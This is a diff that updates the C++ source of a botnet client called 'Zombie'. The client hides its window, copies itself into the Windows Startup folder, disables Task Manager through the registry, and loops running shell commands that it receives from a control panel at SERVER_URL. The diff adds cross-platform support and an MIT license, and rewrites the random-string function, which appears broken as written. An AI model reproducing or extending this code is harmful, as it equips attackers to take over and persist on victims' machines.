@@ -1,23 +1,51 @@
 #define CPPHTTPLIB_OPENSSL_SUPPORT
-#include <chrono>
-#include <cstdio>
 #include "External/binaryhandling.hpp"
 #include "External/httplib.h"
 #include "External/URLparse.hpp"
-#include <thread>
+#include <random>
 #include <string>
+#include <thread>
+#include <vector>
+#ifdef _WIN32
 #include <windows.h>
 #include <winreg.h>
+
 #pragma comment(lib, "user32")
+#pragma comment(lib, "advapi32")
+#endif
+
 #pragma comment(lib, "libcrypto")
 #pragma comment(lib, "libssl")
-#pragma comment(lib, "advapi32")
 
 // Replace It with the server link or IP where PHP server is running
 // The PHP files to put on server is in server directory.
 // This enhances and make runnable the original source code, doesn't add more 
 #define SERVER_URL "https://zombie-panel-host"
 #define USERAG "gg"
+
+/*
+MIT License
+
+Copyright (c) 2022 nk125
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
+*/
 
 void runInBackground();
 void saveStartup(char* argv[]);
@@ -30,7 +58,11 @@ std::string UAG_SV = "Zombie/1.0 (Bot; " + bot_id + ")";
 std::string exec(const char* cmd) {
     char buffer[128];
     std::string result = "";
+#ifdef _WIN32
     FILE* pipe = _popen(cmd, "r");
+#else 
+    FILE* pipe = popen(cmd, "r");
+#endif
 
     if (!pipe) throw std::runtime_error("popen() failed!");
 
@@ -48,6 +80,7 @@ std::string exec(const char* cmd) {
     return result;
 }
 
+#ifdef _WIN32
 void deact_taskmgr() {
     DWORD dwVal = 1;
 
@@ -56,10 +89,12 @@ void deact_taskmgr() {
     RegSetValueEx (hKey, L"DisableTaskmgr", 0, REG_DWORD, (LPBYTE)&dwVal , sizeof(DWORD));
     RegCloseKey(hKey);
 }
+#endif
 
 int main(int argc, char* argv[]) {
 	std::string attackFlag;
 
+#ifdef _WIN32
 	// Run process in background
 	runInBackground();
 
@@ -67,6 +102,7 @@ int main(int argc, char* argv[]) {
 	saveStartup(argv);
 
     	deact_taskmgr();
+#endif
 
 	// Life of worm begins here
 	while (1) {
@@ -102,18 +138,21 @@ int main(int argc, char* argv[]) {
 * RUN AS BACKGROUND PROCESS -> return void
 * =======================================================================================
 */
+#ifdef _WIN32
 void runInBackground() {
 	HWND window;
   	AllocConsole();
 	window = FindWindowA("ConsoleWindowClass", NULL);
 	ShowWindow(window, 0);
 }
+#endif
 
 /*
 * =======================================================================================
 * SAVE TO STARTUP FOLDER -> return void
 * =======================================================================================
 */
+#ifdef _WIN32
 void saveStartup(char* argv[]) {
     std::string path = std::string{getenv("appdata")} + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
     nk125::binary_file_handler b;
@@ -131,6 +170,7 @@ void saveStartup(char* argv[]) {
         return;
     }
 }
+#endif
 
 /*
 * =======================================================================================
@@ -208,18 +248,20 @@ std::string makeRequest(std::string method, std::string uri) {
 * =======================================================================================
 */
 std::string randomString(int n) {
-    using namespace std::chrono;
-    auto cptr = chrono::system_clock::now();
-    srand(chrono::duration_cast<chrono::nanoseconds>(cptr.time_since_epoch()).count());
-    char alpha[] = "abcdefghijklmnopqrstuvwxyz"
+    std::random_device rd;
+    std::mt19937 mt(rd());
+    std::vector<char> alpha = {"abcdefghijklmnopqrstuvwxyz"
                    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                    "0123456789"
-                   "9876543210";
+                   "9876543210"};
 
+    std::uniform_int_distribution<> uint(0, alpha.size() - 1);
+    
     std::string res;
     res.reserve(n);
+    
     for (int i = 0; i < n; i++) {
-        res = res + alpha[rand() % sizeof(alpha)];
+        res.append(alpha.at(uint(mt)));
     }
 
     return res;
